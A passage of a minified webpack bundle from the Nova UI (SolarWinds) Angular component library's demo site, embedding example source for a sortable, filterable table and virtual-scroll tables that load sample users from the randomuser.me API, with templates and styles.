TableAlignmentOptions[] = [\n        "right",\n        "left",\n        "center",\n    ];\n    public densitiesArray: RowHeightOptions[] = ["default", "tiny", "compact"];\n    public alignment: string | undefined = "center";\n    public density: string | undefined = "default";\n    public paginationTotal?: number;\n    public positionWidth: number | undefined = 50;\n    public reorderable: boolean | undefined = true;\n    public resizable: boolean | undefined = true;\n    public searchTerm: string;\n    public sortable: boolean | undefined = true;\n    public optionsForm;\n    public sortDirection: string = "asc";\n    public sortedColumn: string = "position";\n    public isFeatureColumnDisabled: boolean = true;\n    public searchProperties: string[] = [];\n    public selectionConfig: TableSelectionConfig = {\n        enabled: true,\n        selectionMode: TableSelectionMode.Multi,\n    };\n\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n    @ViewChild("filteringSearch") filteringSearch: SearchComponent;\n    @ViewChild("filteringTable")\n    filteringTable: TableComponent<ITestTableModel>;\n    @ViewChild("sortableTable") sortableTable: TableComponent<ITestTableModel>;\n    @ViewChild(TableComponent) testTable: TableComponent<ITestTableModel>;\n\n    private outputsSubscription: Subscription;\n    private searchSubscription: Subscription;\n\n    constructor(\n        @Inject(ToastService) private toastService: IToastService,\n        @Inject(DialogService) private dialogService: DialogService,\n        @Inject(TableStateHandlerService)\n        private tableStateHandlerService: TableStateHandlerService,\n        private formBuilder: NonNullableFormBuilder,\n        public changeDetection: ChangeDetectorRef,\n        public viewContainerRef: ViewContainerRef,\n        public applicationRef: ApplicationRef,\n        public dataSourceService: ClientSideDataSource<ITestTableModel>\n    ) {\n        dataSourceService.setData(ELEMENT_DATA);\n        this.myForm = this.formBuilder.group({\n            checkboxGroup: this.formBuilder.control(this.displayedColumnsCopy, [\n                Validators.required,\n                Validators.minLength(3),\n            ]),\n        });\n        this.optionsForm = this.formBuilder.group({\n            alignment: this.formBuilder.control(this.alignment),\n            density: this.formBuilder.control(this.density),\n            positionWidth: this.formBuilder.control(this.positionWidth),\n            reorderable: this.formBuilder.control(this.reorderable),\n            resizable: this.formBuilder.control(this.resizable),\n            sortable: this.formBuilder.control(this.sortable),\n        });\n    }\n\n    public ngOnInit(): void {\n        this.optionsForm.valueChanges\n            .pipe(debounceTime(500))\n            .subscribe((value) => {\n                this.alignment = value.alignment;\n                this.positionWidth = value.positionWidth;\n                this.density = value.density;\n                this.sortable = value.sortable;\n                this.resizable = value.resizable;\n                this.reorderable = value.reorderable;\n            });\n    }\n\n    async ngAfterViewInit(): Promise<void> {\n        this.dataSourceService.componentTree = {\n            paginator: {\n                componentInstance: this.filteringPaginator,\n            },\n            search: {\n                componentInstance: this.filteringSearch,\n            },\n        };\n\n        this.dataSourceService.registerComponent(\n            this.testTable.getFilterComponents()\n        );\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.dataSource = data.repeat?.itemsSource;\n                    this.paginationTotal = data.paginator?.total;\n                }\n            );\n\n        this.searchSubscription = this.filteringSearch.inputChange\n            .pipe(debounceTime(500))\n            .subscribe(() => {\n                this.dataSourceService.applyFilters();\n            });\n\n        await this.dataSourceService.applyFilters();\n    }\n\n    public sortData(): void {\n        this.dataSourceService.applyFilters();\n    }\n\n    public async onSearch(value: string): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n\n    public async onSearchCancel(): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n\n    public toastColumns(event: Array<string>): void {\n        this.toastService.info({\n            message:\n                "Current order of columns is: " +\n                event.toString().replace(/,/g, ", "),\n        });\n    }\n\n    public async changePagination(): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n\n    public columnsChanged(columns: any): void {\n        this.displayedColumnsCopy = columns;\n    }\n\n    public isChecked(vegetable: string): boolean {\n        return this.displayedColumnsCopy.indexOf(vegetable) > -1;\n    }\n\n    public open(content: TemplateRef<string>): void {\n        this.dialogService.open(content, { size: "sm" });\n    }\n\n    public updateNewColumnValue(event: any): void {\n        this.newColumn = event;\n    }\n\n    public addNewColumn(): void {\n        if (this.newColumn) {\n            this.availableColumns.push(this.newColumn);\n            this.displayedColumnsCopy.push(this.newColumn);\n            this.newColumn = "";\n        }\n    }\n\n    public updateColumns(): void {\n        this.displayedColumns = this.displayedColumnsCopy.slice();\n    }\n\n    public disableSorting(): void {\n        this.isFeatureColumnDisabled = !this.isFeatureColumnDisabled;\n    }\n\n    public limitSearch(): void {\n        if (this.searchProperties.length) {\n            this.searchProperties = [];\n        } else {\n            this.searchProperties = ["outages"];\n        }\n        this.dataSourceService.setSearchProperties(this.searchProperties);\n    }\n\n    // TODO: temporary solution for changing table state dynamically, remove this after NUI-1999\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n        this.searchSubscription.unsubscribe();\n    }\n}\n'},85329:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Injectable } from "@angular/core";\nimport { BehaviorSubject } from "rxjs";\n\nimport {\n    DataSourceService,\n    INovaFilteringOutputs,\n    INovaFilters,\n    SearchService,\n} from "@nova-ui/bits";\n\nimport {\n    IRandomUserResponse,\n    IRandomUserResults,\n    IRandomUserTableModel,\n    UsersQueryResponse,\n} from "./table-virtual-scroll-real-api/table-virtual-scroll-real-api.example.component";\n\n@Injectable()\nexport class RandomuserTableDataSource1 extends DataSourceService<IRandomUserTableModel> {\n    private readonly url = "https://randomuser.me/api";\n    private readonly seed = "sw";\n    private page: number = 1;\n    private dataStart: number = 0;\n    private cache = Array.from<IRandomUserTableModel>({ length: 0 });\n\n    public step: BehaviorSubject<number> = new BehaviorSubject(100);\n    public busy = new BehaviorSubject(false);\n    public itemsToLoad: BehaviorSubject<number> = new BehaviorSubject(500);\n\n    constructor(private searchService: SearchService) {\n        super();\n    }\n\n    public async getFilteredData(\n        filters: INovaFilters\n    ): Promise<INovaFilteringOutputs> {\n        this.busy.next(true);\n\n        // We\'re returning Promise with setTimeout here to make the response from the server longer, as the API being used sends responses\n        // almost immediately. We need it longer to be able the show the spinner component on data load\n        return new Promise((resolve) => {\n            setTimeout(() => {\n                this.getData(\n                    this.dataStart,\n                    this.dataStart + this.step.value\n                ).then((response: UsersQueryResponse | undefined) => {\n                    if (!response) {\n                        return;\n                    }\n\n                    this.cache = this.cache.concat(response.users);\n                    this.dataSubject.next(this.cache);\n                    resolve({\n                        repeat: {\n                            itemsSource: this.cache,\n                        },\n                        // This API can return thousands of results, however doesn\'t return the max number of results,\n                        // so we set the max number of result manually here.\n                        itemsToLoad: this.itemsToLoad.value,\n                        totalItems: 1575,\n                        start: response.start,\n                    });\n                    this.busy.next(false);\n                    this.dataStart += this.step.value;\n                    this.page++;\n                });\n            }, 500);\n        });\n    }\n\n    public async getData(\n        start: number = 0,\n        end: number = 20\n    ): Promise<UsersQueryResponse | undefined> {\n        let response: IRandomUserResponse | undefined;\n        try {\n            response = await (\n                await fetch(\n                    `${this.url}/?page=${this.page}&results=${\n                        end - start\n                    }&seed=${this.seed}`\n                )\n            ).json();\n            return {\n                users: response?.results.map(\n                    (result: IRandomUserResults, i: number) => ({\n                        no: this.cache.length + i + 1,\n                        nameTitle: result.name.title,\n                        nameFirst: result.name.first,\n                        nameLast: result.name.last,\n                        gender: result.gender,\n                        country: result.location.country,\n                        city: result.location.city,\n                        postcode: result.location.postcode,\n                        email: result.email,\n                        cell: result.cell,\n                    })\n                ),\n                total: response?.results.length,\n                start: start,\n            } as UsersQueryResponse;\n        } catch (e) {\n            console.error(\n                "Error responding from server. Please visit https://https://randomuser.me/ to see if it\'s available"\n            );\n        }\n    }\n}\n'},55375:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Injectable } from "@angular/core";\nimport { BehaviorSubject } from "rxjs";\n\nimport {\n    DataSourceService,\n    INovaFilteringOutputs,\n    INovaFilters,\n} from "@nova-ui/bits";\n\nimport {\n    IRandomUserResponse,\n    IRandomUserResults,\n    IRandomUserTableModel,\n    UsersQueryResponse,\n} from "./table-virtual-scroll-real-api/table-virtual-scroll-real-api.example.component";\n\n@Injectable()\nexport class RandomuserTableDataSource extends DataSourceService<IRandomUserTableModel> {\n    private readonly url = "https://randomuser.me/api";\n    private readonly seed = "sw";\n\n    private cache = Array.from<IRandomUserTableModel>({ length: 0 });\n    public page: number = 1;\n    public busy = new BehaviorSubject(false);\n\n    public async getFilteredData(\n        filters: INovaFilters\n    ): Promise<INovaFilteringOutputs> {\n        this.busy.next(true);\n        const virtualScrollFilter =\n            filters.virtualScroll && filters.virtualScroll.value;\n        const start = virtualScrollFilter\n            ? filters.virtualScroll?.value.start\n            : 0;\n        const end = virtualScrollFilter ? filters.virtualScroll?.value.end : 0;\n\n        // We\'re returning Promise with setTimeout here to make the response from the server longer, as the API being used sends responses\n        // almost immediately. We need it longer to be able the show the spinner component on data load\n        return new Promise((resolve) => {\n            setTimeout(() => {\n                this.getData(start, end).then(\n                    (response: UsersQueryResponse | undefined) => {\n                        if (!response) {\n                            return;\n                        }\n\n                        this.cache = this.cache.concat(response.users);\n                        this.dataSubject.next(this.cache);\n                        resolve({\n                            repeat: {\n                                itemsSource: this.cache,\n                            },\n                            // This API can return thousands of results, however doesn\'t return the max number of results,\n                            // so we set the max number of result manually here.\n                            totalItems: 200,\n                            start: response.start,\n                        });\n                        this.busy.next(false);\n                    }\n                );\n            }, 2000);\n        });\n    }\n\n    public async getData(\n        start: number = 0,\n        end: number = 20\n    ): Promise<UsersQueryResponse | undefined> {\n        let response: IRandomUserResponse | undefined;\n        try {\n            response = await (\n                await fetch(\n                    `${this.url}/?page=${this.page}&results=${\n                        end - start\n                    }&seed=${this.seed}`\n                )\n            ).json();\n            return {\n                users: response?.results.map(\n                    (result: IRandomUserResults, i: number) => ({\n                        no: this.cache.length + i + 1,\n                        nameTitle: result.name.title,\n                        nameFirst: result.name.first,\n                        nameLast: result.name.last,\n                        gender: result.gender,\n                        country: result.location.country,\n                        city: result.location.city,\n                        postcode: result.location.postcode,\n                        email: result.email,\n                        cell: result.cell,\n                    })\n                ),\n                total: response?.results.length,\n                start: start,\n            } as UsersQueryResponse;\n        } catch (e) {\n            console.error(\n                "Error responding from server. Please visit https://https://randomuser.me/ to see if it\'s available"\n            );\n        }\n    }\n}\n'},36958:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div\n    [style.height.px]="gridHeight"\n    [style.max-width.px]="1300"\n    style="border-color: lightgrey"\n>\n    <cdk-virtual-scroll-viewport\n        [style.height.px]="gridHeight"\n        tableVirtualScroll\n        [rowHeight]="24"\n        [offset]="40"\n    >\n        <table\n            nui-table\n            [dataSource]="users"\n            [resizable]="false"\n            [reorderable]="true"\n        >\n            <ng-container nuiColumnDef="no" [columnWidth]="50">\n                <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.no }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameTitle" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Title</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameTitle }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameFirst" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>First Name</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameFirst }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameLast" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Last Name</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameLast }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="gender" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Gender</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.gender }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="country" [columnWidth]="150">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Country</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.country }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="city" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>City</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.city }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="postcode" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Postcode</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.postcode }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="email" [columnWidth]="200">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Email</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.email }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="cell" [columnWidth]="150">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Cell</th>\n                <td\n                    nui-cell\n                    *nuiCellDef="let element"\n                    style="overflow: visible"\n                >\n                    {{ element.cell }}\n                </td>\n            </ng-container>\n\n            <tr\n                nui-header-row\n                *nuiHeaderRowDef="displayedColumns; sticky: true"\n            ></tr>\n            <tr\n                nui-row\n                *nuiRowDef="let row; columns: displayedColumns"\n                density="tiny"\n            ></tr>\n        </table>\n    </cdk-virtual-scroll-viewport>\n</div>\n\n<footer\n    *ngIf="users.length !== totalItems"\n    style="color: #767676; height: 20px"\n    [style.max-width.px]="1285"\n    class="d-flex justify-content-center align-items-center"\n>\n    <div class="h-100 w-100">\n        <div *ngIf="isBusy">\n            <nui-progress [show]="isBusy" compactMode="true"></nui-progress>\n        </div>\n    </div>\n</footer>\n'},68381:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-typography.less";\n@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n.nui-demo-scrolling-footer {\n    .setCssVariable(background-color, nui-color-bg-transparent);\n    .setCssVariable(color, nui-color-text-secondary);\n    height: 24px;\n    border: 1px solid;\n    .setCssVariable(border-color, nui-color-line-default);\n    max-width: 1285px;\n    .nui-text-small-secondary();\n}\n'},32765:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ListRange } from "@angular/cdk/collections";\nimport { CdkVirtualScrollViewport } from "@angular/cdk/scrolling";\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    ChangeDetectorRef,\n    Component,\n    forwardRef,\n    OnDestroy,\n    OnInit,\n    ViewChild,\n} from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    IFilter,\n    IFilteringOutputs,\n    SelectorService,\n    TableComponent,\n    TableVirtualScrollDirective,\n} from "@nova-ui/bits";\n\nimport { IRandomUserTableModel } from "../index";\nimport { RandomuserTableDataSource } from "../table-virtual-scroll-datasource";\n\n@Component({\n    selector: "nui-table-virtual-scroll-real-api-minimalist-example",\n    templateUrl:\n        "./table-virtual-scroll-real-api-minimalist.example.component.html",\n    styleUrls: [\n        "./table-virtual-scroll-real-api-minimalist.example.component.less",\n    ],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TableVirtualScrollRealApiMinimalistExampleComponent\n    implements AfterViewInit, OnDestroy, OnInit\n{\n    // This value is obtained from the server and used to evaluate the total number of pages to display\n    private _totalItems: number = 0;\n    // This value is being depending to obtain the total number of pages available depending on the range of the fatched items selected\n    private totalPages: number = 0;\n    private lastPageFetched: number = 0;\n    // Since we always have the first pagge fetched automatically (on OnInit), it\'s fair to say we always start with the first page prefetched\n    private prefetchedDsPageNumber: number = 1;\n    // The range of items to fetch from the server and display within the viewport.\n    private range: number = 40;\n    private _isBusy: boolean = false;\n    private virtualScrollFilterValue: ListRange = { start: 0, end: this.range };\n    private onDestroy$: Subject<void> = new Subject<void>();\n\n    get totalItems(): number {\n        return this._totalItems;\n    }\n    get isBusy(): boolean {\n        return this._isBusy;\n    }\n\n    // The dynamically changed array of items to render by the table\n    public users: IRandomUserTableModel[] = [];\n    public dataSourceObs = new Subject<any[]>();\n    public displayedColumns: string[] = [\n        "no",\n        "nameTitle",\n        "nameFirst",\n        "nameLast",\n        "gender",\n        "country",\n        "city",\n        "postcode",\n        "email",\n        "cell",\n    ];\n    public gridHeight = 400;\n    public makeSticky: boolean = true;\n    private dataSource: RandomuserTableDataSource;\n\n    constructor(\n        public selectorService: SelectorService,\n        private cd: ChangeDetectorRef\n    ) {\n        this.dataSource = new RandomuserTableDataSource();\n    }\n\n    @ViewChild(forwardRef(() => TableComponent), { static: false })\n    table: TableComponent<any>;\n    @ViewChild(forwardRef(() => TableVirtualScrollDirective), { static: false })\n    virtualDirective: TableVirtualScrollDirective;\n    @ViewChild(CdkVirtualScrollViewport, { static: false })\n    viewport: CdkVirtualScrollViewport;\n\n    public ngOnInit(): void {\n        this.dataSource.outputsSubject.subscribe(\n            (outputs: IFilteringOutputs) => {\n                if (outputs) {\n                    this.users = outputs.repeat.itemsSource;\n                    this._totalItems = outputs.totalItems;\n                    this.totalPages = Math.floor(this._totalItems / this.range);\n                    // This condition handles the case when the number of items fetched is less than the viewport size.\n                    // To have virtual scroll working, we need to prefetch the number of items missing to trigger the scrollbar.\n                    if (\n                        this.users.length <\n                        Math.round(\n                            this.viewport.getViewportSize() /\n                                this.virtualDirective.rowHeight\n                        )\n                    ) {\n                        this.prefetchedDsPageNumber++;\n                        this.dataSource.page = this.prefetchedDsPageNumber;\n                        this.dataSource.applyFilters();\n                    }\n                    this.cd.detectChanges();\n                }\n            }\n        );\n\n        this.dataSource.busy.subscribe((busy) => {\n            this._isBusy = busy;\n        });\n    }\n\n    public ngAfterViewInit(): void {\n        this.registerVirtualScroll();\n\n        // Setting the items range to properly evaluate the virtual scroll viewport size\n        this.virtualDirective.setMaxItems(this.range);\n\n        this.viewport.renderedRangeStream\n            .pipe(takeUntil(this.onDestroy$))\n            .subscribe((value) => {\n                // There is no use to proceed if we\'ve already fetched all the items\n                if (this.users.length === this._totalItems) {\n                    return;\n                }\n\n                const page = Math.floor(value.end / this.range);\n                if (page > this.lastPageFetched && page <= this.totalPages) {\n                    const start = page * this.range;\n                    const end = start + this.range;\n                    this.virtualScrollFilterValue = { start: start, end: end };\n                    this.lastPageFetched = page;\n                    // Due to a specificity of the chosen API, we explicitly send it the page number, because the API can\n                    // return data in pages. This can vary depending on the user\'s usecase\n                    this.dataSource.page = this.prefetchedDsPageNumber + page;\n\n                    this.dataSource.applyFilters();\n                }\n            });\n\n        this.dataSource.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.dataSource.busy.unsubscribe();\n        this.dataSource.outputsSubject.unsubscribe();\n        this.onDestroy$.next();\n        this.onDestroy$.complete();\n    }\n\n    private registerVirtualScroll() {\n        this.dataSource.registerComponent({\n            virtualScroll: {\n                componentInstance: {\n                    getFilters: () =>\n                        <IFilter<ListRange>>{\n                            type: "virtualScroll",\n                            value: this.virtualScrollFilterValue,\n                        },\n                },\n            },\n        });\n    }\n}\n'},27627:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div\n    [style.height.px]="gridHeight"\n    [style.max-width.px]="1300"\n    style="border-color: lightgrey"\n>\n    <cdk-virtual-scroll-viewport\n        [style.height.px]="gridHeight"\n        tableVirtualScroll\n        [rowHeight]="24"\n        [offset]="40"\n    >\n        <table\n            nui-table\n            [dataSource]="users"\n            [resizable]="false"\n            [reorderable]="true"\n        >\n            <ng-container nuiColumnDef="no" [columnWidth]="50">\n                <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.no }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameTitle" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Title</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameTitle }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameFirst" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>First Name</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameFirst }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameLast" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Last Name</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameLast }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="gender" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Gender</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.gender }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="country" [columnWidth]="150">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Country</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.country }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="city" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>City</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.city }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="postcode" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Postcode</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.postcode }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="email" [columnWidth]="200">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Email</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.email }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="cell" [columnWidth]="150">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Cell</th>\n                <td\n                    nui-cell\n                    *nuiCellDef="let element"\n                    style="overflow: visible"\n                >\n                    {{ element.cell }}\n                </td>\n            </ng-container>\n\n            <tr\n                nui-header-row\n                *nuiHeaderRowDef="displayedColumns; sticky: true"\n            ></tr>\n            <tr\n                nui-row\n                *nuiRowDef="let row; columns: displayedColumns"\n                density="tiny"\n            ></tr>\n        </table>\n    </cdk-virtual-scroll-viewport>\n</div>\n\n<footer\n    class="d-flex justify-content-center align-items-center nui-demo-scrolling-footer"\n>\n    <div class="h-100 w-100">\n        <div *ngIf="isBusy; else defaultText">\n            <nui-progress\n                [show]="isBusy"\n                helpText="Loading next {{ range }} items..."\n            ></nui-progress>\n        </div>\n        <ng-template #defaultText>\n            <div class="h-100 d-flex justify-content-center align-items-center">\n                Showing first\n                <span class="px-2">{{ users.length }}</span>\n                of\n                <span class="pl-2">{{ totalItems }}</span>\n                <span *ngIf="users.length !== totalItems; else endOfData"\n                    >, scroll down for more.</span\n                >\n            </div>\n            <ng-template #endOfData\n                ><strong>. All items loaded.</strong></ng-template\n            >\n        </ng-template>\n    </div>\n</footer>\n'},719:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-typography.less";\n@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n.nui-demo-scrolling-footer {\n    .setCssVariable(background-color, nui-color-bg-transparent);\n    .setCssVariable(color, nui-color-text-secondary);\n    height: 24px;\n    border: 1px solid;\n    .setCssVariable(border-color, nui-color-line-default);\n    max-width: 1285px;\n    .nui-text-small-secondary();\n}\n'},97843:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ListRange } from "@angular/cdk/collections";\nimport { CdkVirtualScrollViewport } from "@angular/cdk/scrolling";\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    ChangeDetectorRef,\n    Component,\n    forwardRef,\n    OnDestroy,\n    OnInit,\n    ViewChild,\n} from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    IFilter,\n    IFilteringOutputs,\n    SelectorService,\n    TableComponent,\n    TableVirtualScrollDirective,\n} from "@nova-ui/bits";\n\nimport { IRandomUserTableModel } from "../index";\nimport { RandomuserTableDataSource } from "../table-virtual-scroll-datasource";\n\n@Component({\n    selector: "nui-table-virtual-scroll-real-api-progress-footer-example",\n    templateUrl:\n        "./table-virtual-scroll-real-api-progress-footer.example.component.html",\n    styleUrls: [\n        "./table-virtual-scroll-real-api-progress-footer.example.component.less",\n    ],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TableVirtualScrollRealApiProgressFooterExampleComponent\n    implements AfterViewInit, OnDestroy, OnInit\n{\n    // This value is obtained from the server and used to evaluate the total number of pages to display\n    private _totalItems: number = 0;\n    // This value is being depending to obtain the total number of pages available depending on the range of the fatched items selected\n    private totalPages: number = 0;\n    private lastPageFetched: number = 0;\n    // Since we always have the first pagge fetched automatically (on OnInit), it\'s fair to say we always start with the first page prefetched\n    private prefetchedDsPageNumber: number = 1;\n    // The range of items to fetch from the server and display within the viewport.\n    private range: number = 40;\n    private _isBusy: boolean = false;\n    private virtualScrollFilterValue: ListRange = { start: 0, end: this.range };\n    private onDestroy$: Subject<void> = new Subject<void>();\n\n    get totalItems(): number {\n        return this._totalItems;\n    }\n    get isBusy(): boolean {\n        return this._isBusy;\n    }\n\n    // The dynamically changed array of items to render by the table\n    public users: IRandomUserTableModel[] = [];\n    public dataSourceObs = new Subject<any[]>();\n    public displayedColumns: string[] = [\n        "no",\n        "nameTitle",\n        "nameFirst",\n        "nameLast",\n        